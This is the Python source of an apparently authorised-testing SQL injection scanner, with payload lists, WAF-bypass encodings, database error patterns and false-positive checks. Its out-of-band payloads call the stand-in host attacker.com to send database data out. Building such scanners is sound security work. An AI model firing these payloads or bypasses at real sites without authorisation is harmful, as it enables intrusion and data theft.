"""SQL Injection scanner module — detects error-based, boolean, time-based, UNION, stacked, and OOB SQLi.

FP reduction strategy:
- Canary injection: inject a unique marker, verify it appears in the response before trusting error patterns
- Baseline comparison: compare injected responses against a clean baseline (length + content delta)
- Boolean verification: require TRUE response ≈ baseline AND FALSE response significantly different
- Time verification: 2-sample timing (baseline + payload), require ≥3× baseline AND ≥4.5s absolute
- Confidence scoring: derive from evidence quality (canary confirmed, baseline delta, confirming payloads)
- Request/response logging: store full HTTP data in findings
"""

import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse, quote
from typing import Optional
from datetime import datetime, timezone

from .config import Finding, Severity, FindingType, ScanConfig
from .http_client import HttpClient


# SQLi error patterns per database
ERROR_PATTERNS = {
    "MySQL": [
        r"SQL syntax.*?MySQL", r"Warning.*?\Wmysqli?_", r"valid MySQL result",
        r"MySqlClient\.", r"mysql_fetch", r"mysql_num_rows",
        r"supplied argument is not a valid MySQL",
        r"check the manual that (corresponds|fits) to your MySQL server",
        r"Unknown column '[^']+' in 'order clause'",
        r"MySqlErrorException",
    ],
    "PostgreSQL": [
        r"PostgreSQL.*?error", r"Warning.*?\Wpg_", r"valid PostgreSQL result",
        r"Npgsql\.", r"PSQLException", r"ERROR: syntax error",
        r"unterminated quoted string", r"could not prepare statement",
    ],
    "MSSQL": [
        r"ODBC SQL Server Driver", r"SQLServer JDBC", r"Driver.*?SQL[\-\_\ ]*Server",
        r"SqlException", r"System\.Data\.SqlClient",
        r"Unclosed quotation mark", r"Syntax error.*?SQL Server",
    ],
    "Oracle": [
        r"ORA-\d{5}", r"Oracle error", r"Oracle.*?Driver",
        r"oracle\.jdbc", r"quoted string not properly terminated",
    ],
    "SQLite": [
        r"SQLite/JDBCDriver", r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"sqlite_", r"unrecognized token",
    ],
}

# Boolean-based payloads
BOOLEAN_PAYLOADS = [
    ("' AND 1=1--", "' AND 1=2--"),
    ("' AND 'a'='a'--", "' AND 'a'='b'--"),
    (") AND 1=1--", ") AND 1=2--"),
    ("')) AND 1=1--", "')) AND 1=2--"),
    ("\" AND 1=1--", "\" AND 1=2--"),
    (" AND 1=1", " AND 1=2"),
    ("') AND 1=1--", "') AND 1=2--"),
]

# Time-based payloads
TIME_PAYLOADS = [
    "' AND SLEEP(5)--",
    "' AND (SELECT SLEEP(5))--",
    "'; WAITFOR DELAY '0:0:5'--",
    "' AND pg_sleep(5)--",
    "' OR SLEEP(5)--",
    "1; SELECT pg_sleep(5)--",
    "' UNION SELECT SLEEP(5)--",
    "') AND SLEEP(5)--",
    "')) AND SLEEP(5)--",
    "\" AND SLEEP(5)--",
]

# UNION-based payloads
UNION_PAYLOADS = [
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL,NULL,NULL--",
    "' UNION SELECT 1,2,3--",
    "' UNION SELECT 1,2,3,4,5--",
    "' UNION SELECT @@version,NULL,NULL--",
    "' UNION SELECT version(),NULL,NULL--",
    "' UNION ALL SELECT NULL,NULL,NULL--",
]

# Stacked query payloads
STACKED_PAYLOADS = [
    "'; SELECT 1--",
    "'; SELECT SLEEP(0)--",
    "'); SELECT 1--",
    "'; SELECT 1; SELECT 2--",
]

# OOB payloads
OOB_PAYLOADS = [
    "' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\',@@version,'.attacker.com\\\\a'))--",
    "' UNION SELECT UTL_HTTP.REQUEST('http://attacker.com/'||@@version)--",
    "'; EXEC master..xp_dirtree 'http://attacker.com/'--+",
]

# WAF bypass encodings
WAF_BYPASS = {
    "space_comment": lambda p: p.replace(" ", "/**/"),
    "double_encode": lambda p: quote(quote(p, safe=""), safe=""),
    "case_mixed": lambda p: "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(p)),
    "null_byte": lambda p: p.replace("'", "'%00"),
}


def _canary_tag(n: int) -> str:
    """Generate a unique canary string for injection testing."""
    return f"wbsqli{n:04d}"


def _content_similarity(a: str, b: str) -> float:
    """Rough content similarity score (0.0–1.0) based on common n-grams."""
    if not a or not b:
        return 0.0
    # Use short substrings for speed
    short_a = a[:2000]
    short_b = b[:2000]
    if short_a == short_b:
        return 1.0
    # Length-based similarity
    max_len = max(len(short_a), len(short_b), 1)
    len_diff = abs(len(short_a) - len(short_b))
    len_sim = 1.0 - (len_diff / max_len)
    # Word overlap
    words_a = set(short_a.split()[:200])
    words_b = set(short_b.split()[:200])
    if not words_a or not words_b:
        return len_sim * 0.5
    overlap = len(words_a & words_b) / max(len(words_a | words_b), 1)
    return 0.5 * len_sim + 0.5 * overlap


def _derive_confidence(canary_confirmed: bool, baseline_delta: float, confirming_count: int) -> float:
    """Derive confidence score from evidence quality."""
    score = 0.5
    if canary_confirmed:
        score += 0.2  # Parameter is injectable (reflected)
    if baseline_delta > 0.3:
        score += 0.15  # Significant difference from baseline
    elif baseline_delta > 0.1:
        score += 0.05
    if confirming_count >= 2:
        score += 0.15  # Multiple confirming observations
    elif confirming_count >= 1:
        score += 0.05
    return min(round(score, 2), 0.95)


def _build_request_info(method: str, url: str, param: str, value: str, body: dict = None) -> str:
    """Build a human-readable request string for evidence."""
    if method == "GET":
        return f"GET {url}"
    else:
        val_preview = value[:100]
        return f"POST {url} {param}={val_preview}"


class SQLiScanner:
    """SQL Injection detection with canary-based FP reduction and baseline comparison."""

    def __init__(self, config: ScanConfig):
        self.config = config
        self.client = HttpClient(config)
        self.findings: list[Finding] = []
        self._baseline_cache: dict[str, dict] = {}  # key -> {text, length, status}

    async def _get_baseline(self, url: str, param: str) -> Optional[dict]:
        """Get the baseline response for comparison."""
        key = f"{url}:{param}"
        if key in self._baseline_cache:
            return self._baseline_cache[key]
        resp = await self.client.get(url)
        if resp:
            self._baseline_cache[key] = {
                "text": resp.text[:3000],
                "length": len(resp.text),
                "status": resp.status_code,
            }
            return self._baseline_cache[key]
        return None

    def _check_error_patterns(self, text: str) -> Optional[tuple[str, str]]:
        """Check response for database error patterns."""
        for db, patterns in ERROR_PATTERNS.items():
            for pattern in patterns:
                match = re.search(pattern, text, re.IGNORECASE)
                if match:
                    return db, match.group(0)
        return None

    async def _inject_canary(self, url: str, param: str, original_value: str, method: str) -> tuple[bool, Optional[str]]:
        """Inject a unique canary to verify the parameter is reflected in the response.

        Returns (canary_reflected, canary_value).
        """
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)
        canary = _canary_tag(hash(f"{url}:{param}") % 10000)
        test_value = original_value + canary

        if method == "GET":
            tp = dict(params_dict)
            tp[param] = [test_value]
            test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
            resp = await self.client.get(test_url)
        else:
            resp = await self.client.post(url, data={param: test_value})

        if resp and canary in resp.text:
            return True, canary
        return False, canary

    async def scan_param(self, url: str, param: str, method: str = "GET") -> list[Finding]:
        """Test a single parameter for SQL injection with FP reduction."""
        findings = []
        parsed = urlparse(url)
        params_dict = parse_qs(parsed.query)

        if param not in params_dict:
            original_value = ""
        else:
            original_value = params_dict[param][0]

        baseline = await self._get_baseline(url, param)
        if not baseline:
            return findings

        # Step 0: Canary injection — verify parameter is injectable
        canary_confirmed, canary_value = await self._inject_canary(url, param, original_value, method)

        # Track confirming observations for confidence
        confirming_count = 0

        # 1. Error-based detection — verify error isn't in baseline
        for payload_list, scan_name in [
            (UNION_PAYLOADS, "UNION"),
            (STACKED_PAYLOADS, "Stacked"),
            (OOB_PAYLOADS, "OOB"),
        ]:
            for payload in payload_list:
                test_value = original_value + payload
                if method == "GET":
                    test_params = dict(params_dict)
                    test_params[param] = [test_value]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = urlunparse(parsed._replace(query=test_query))
                    resp = await self.client.get(test_url)
                else:
                    resp = await self.client.post(url, data={param: test_value})

                if not resp:
                    continue

                error = self._check_error_patterns(resp.text)
                if error:
                    db, evidence = error
                    # FP check: is this error also in the baseline?
                    baseline_error = self._check_error_patterns(baseline["text"])
                    if baseline_error and baseline_error[0] == db and baseline_error[1] == evidence:
                        # Same error exists in baseline — likely a false positive
                        continue
                    confirming_count += 1
                    baseline_delta = 1.0 - _content_similarity(baseline["text"], resp.text[:2000])
                    confidence = _derive_confidence(canary_confirmed, baseline_delta, confirming_count)
                    findings.append(Finding(
                        finding_type=FindingType.SQLI,
                        severity=Severity.CRITICAL,
                        url=url, parameter=param, payload=payload,
                        evidence=f"[{scan_name}] {db} error: {evidence}" + (" (canary confirmed)" if canary_confirmed else ""),
                        request=_build_request_info(method, url if method == "GET" else url, param, test_value, body={param: test_value} if method == "POST" else None),
                        response=resp.text[:500],
                        remediation=f"Use parameterized queries/prepared statements for {param}. Never concatenate user input into SQL.",
                        confidence=confidence,
                        timestamp=datetime.now(timezone.utc).isoformat(),
                    ))
                    break

        # 2. Boolean-based detection with improved baseline comparison
        for true_payload, false_payload in BOOLEAN_PAYLOADS:
            true_value = original_value + true_payload
            false_value = original_value + false_payload

            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [true_value]
                true_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                true_resp = await self.client.get(true_url)

                fp = dict(params_dict)
                fp[param] = [false_value]
                false_url = urlunparse(parsed._replace(query=urlencode(fp, doseq=True)))
                false_resp = await self.client.get(false_url)
            else:
                true_resp = await self.client.post(url, data={param: true_value})
                false_resp = await self.client.post(url, data={param: false_value})

            if not true_resp or not false_resp:
                continue

            # Improved comparison: use content similarity, not just length
            true_sim = _content_similarity(baseline["text"], true_resp.text[:2000])
            false_sim = _content_similarity(baseline["text"], false_resp.text[:2000])
            baseline_delta = abs(true_sim - false_sim)

            # TRUE should be similar to baseline, FALSE should be different
            # Require at least 20% similarity gap
            if true_sim > 0.7 and baseline_delta > 0.2:
                confirming_count += 1
                confidence = _derive_confidence(canary_confirmed, baseline_delta, confirming_count)
                findings.append(Finding(
                    finding_type=FindingType.SQLI,
                    severity=Severity.HIGH,
                    url=url, parameter=param, payload=f"{true_payload} / {false_payload}",
                    evidence=f"Boolean diff: TRUE similarity={true_sim:.2f}, FALSE similarity={false_sim:.2f}, delta={baseline_delta:.2f}" + (" (canary confirmed)" if canary_confirmed else ""),
                    request=_build_request_info(method, url, param, f"{true_payload}/{false_payload}"),
                    response=true_resp.text[:500] if true_resp else "",
                    remediation=f"Use parameterized queries for {param}. Implement input validation.",
                    confidence=confidence,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break

        # 3. Time-based detection — 2-sample verification
        baseline_time = None
        baseline_start = time.monotonic()
        baseline_resp2 = await self.client.get(url)
        baseline_time = time.monotonic() - baseline_start if baseline_resp2 else 2.0

        # Take 2 baseline samples for reliability
        if baseline_time < 1.0:
            baseline_start2 = time.monotonic()
            baseline_resp3 = await self.client.get(url)
            if baseline_resp3:
                second_time = time.monotonic() - baseline_start2
                baseline_time = max(baseline_time, second_time)  # Use worst-case baseline

        for payload in TIME_PAYLOADS:
            test_value = original_value + payload
            start = time.monotonic()
            if method == "GET":
                tp = dict(params_dict)
                tp[param] = [test_value]
                test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                resp = await self.client.get(test_url)
            else:
                resp = await self.client.post(url, data={param: test_value})
            elapsed = time.monotonic() - start

            # Require at least 3x baseline time AND at least 4.5s absolute
            if resp and elapsed >= max(4.5, baseline_time * 3):
                confirming_count += 1
                confidence = _derive_confidence(canary_confirmed, elapsed / max(baseline_time, 0.1), confirming_count)
                findings.append(Finding(
                    finding_type=FindingType.SQLI,
                    severity=Severity.HIGH,
                    url=url, parameter=param, payload=payload,
                    evidence=f"Time-based: response took {elapsed:.2f}s (baseline {baseline_time:.2f}s, ratio {elapsed/max(baseline_time,0.01):.1f}x)" + (" (canary confirmed)" if canary_confirmed else ""),
                    request=_build_request_info(method, url, param, payload),
                    response=resp.text[:500] if resp else "",
                    remediation=f"Use parameterized queries for {param}. Implement strict input validation and WAF rules.",
                    confidence=confidence,
                    timestamp=datetime.now(timezone.utc).isoformat(),
                ))
                break

        # 4. WAF bypass attempts if no findings yet
        if not findings:
            for bypass_name, bypass_fn in WAF_BYPASS.items():
                for true_p, false_p in BOOLEAN_PAYLOADS[:3]:
                    try:
                        bp = bypass_fn(true_p)
                        test_value = original_value + bp
                        if method == "GET":
                            tp = dict(params_dict)
                            tp[param] = [test_value]
                            test_url = urlunparse(parsed._replace(query=urlencode(tp, doseq=True)))
                            resp = await self.client.get(test_url)
                        else:
                            resp = await self.client.post(url, data={param: test_value})

                        if resp:
                            error = self._check_error_patterns(resp.text)
                            if error:
                                db, evidence = error
                                # FP check against baseline
                                baseline_error = self._check_error_patterns(baseline["text"])
                                if baseline_error and baseline_error[0] == db and baseline_error[1] == evidence:
                                    continue
                                confirming_count += 1
                                confidence = _derive_confidence(canary_confirmed, 0.5, confirming_count)
                                findings.append(Finding(
                                    finding_type=FindingType.SQLI,
                                    severity=Severity.HIGH,
                                    url=url, parameter=param, payload=f"[{bypass_name}] {bp}",
                                    evidence=f"WAF bypass ({bypass_name}): {db} error: {evidence}" + (" (canary confirmed)" if canary_confirmed else ""),
                                    request=_build_request_info(method, url, param, bp),
                                    response=resp.text[:500],
                                    remediation="Fix the underlying SQL injection AND improve WAF rules.",
                                    confidence=confidence,
                                    timestamp=datetime.now(timezone.utc).isoformat(),
                                ))
                                break
                    except Exception:
                        continue
                if findings:
                    break

        self.findings.extend(findings)
        return findings

    async def scan_url(self, url: str, params: list[dict] = None) -> list[Finding]:
        """Scan all parameters of a URL for SQL injection."""
        all_findings = []
        if params:
            for p in params:
                findings = await self.scan_param(url, p["name"])
                all_findings.extend(findings)
        else:
            parsed = urlparse(url)
            for param_name in parse_qs(parsed.query).keys():
                findings = await self.scan_param(url, param_name)
                all_findings.extend(findings)
        return all_findings

    async def scan_forms(self, forms: list[dict]) -> list[Finding]:
        """Test form fields for SQL injection."""
        all_findings = []
        for form in forms:
            for field in form["fields"]:
                if field["type"] in ("hidden", "submit", "button"):
                    continue
                findings = await self.scan_param(form["action"], field["name"], method=form["method"])
                all_findings.extend(findings)
        return all_findings

    async def close(self):
        await self.client.close()